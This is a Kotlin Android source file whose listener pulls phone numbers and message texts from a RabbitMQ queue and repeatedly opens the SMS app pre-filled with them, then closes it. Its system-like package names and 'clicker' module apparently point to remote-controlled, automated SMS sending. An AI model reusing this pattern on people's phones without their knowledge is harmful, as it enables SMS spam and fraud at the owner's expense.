package com.android.rabbit.rabbitmq

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat.finishAffinity
import com.android.clicker.data.MessageModel
import com.android.clicker.rabbitmq.RabbitMQManager
import com.android.clicker.rabbitmq.RabbitMQManager.closeMessagingApp
import com.android.clicker.rabbitmq.gson
import com.android.clicker.rabbitmq.smsSender
import com.android.rabbit.MainActivity
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.nio.charset.StandardCharsets

@RequiresApi(Build.VERSION_CODES.KITKAT)
@OptIn(DelicateCoroutinesApi::class)
fun listener(context: Context) {
    CoroutineScope(Dispatchers.IO).launch {
        try {
            RabbitMQManager.connect()
            RabbitMQManager.state = true
            val queueName = RabbitMQManager.queue
            RabbitMQManager.channel.queueDeclare(queueName, true, false, false, null)
            while (true) {
                if (!RabbitMQManager.inProcess) {

                    RabbitMQManager.inProcess = true

                    RabbitMQManager.receivedMessage =
                        RabbitMQManager.getMessageFromQueue(queueName).toString()

                    if (RabbitMQManager.receivedMessage!=null) {

                       var signal = gson.fromJson(RabbitMQManager.receivedMessage, MessageModel::class.java)

                        if (signal!=null){
                            try {
                                if (signal.phone.startsWith("+")) {

                                    RabbitMQManager.lastId = signal.sms_id
                                    RabbitMQManager.intent  = Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:${signal.phone}"))
                                    RabbitMQManager.intent.putExtra("sms_body", signal.text)
                                    context.startActivity(RabbitMQManager.intent )

                                    delay(9000)

                                    closeMessagingApp(context)
                                    delay(1000)
                                }
                            } catch (e: Exception) {
                                println(e.localizedMessage + " error1")
                            }
                        }

                    }
                    RabbitMQManager.receivedMessage =null

                } else {
                    RabbitMQManager.inProcess = false
                }
                RabbitMQManager.receivedMessage = null
                System.gc()
            }
        } catch (e: Exception) {
            //listener(context)
            println(e.localizedMessage+" error2")
            RabbitMQManager.state = false
        }

    }
}

